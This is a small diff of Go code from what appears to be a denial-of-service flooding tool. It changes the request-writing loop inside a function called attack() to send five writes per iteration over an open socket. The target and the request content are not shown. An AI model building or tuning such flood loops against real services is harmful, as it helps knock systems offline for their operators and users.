@@ -117,7 +117,11 @@ func attack() {
 		if err != nil {
 			fmt.Println("Connection Down!!!")
 		} else {
-			for i := 0; i < 800; i++ {
+			for i := 0; i < 100; i++ {
+				s.Write([]byte(request))
+				s.Write([]byte(request))
+				s.Write([]byte(request))
+				s.Write([]byte(request))
 				s.Write([]byte(request))
 			}
 			s.Close()
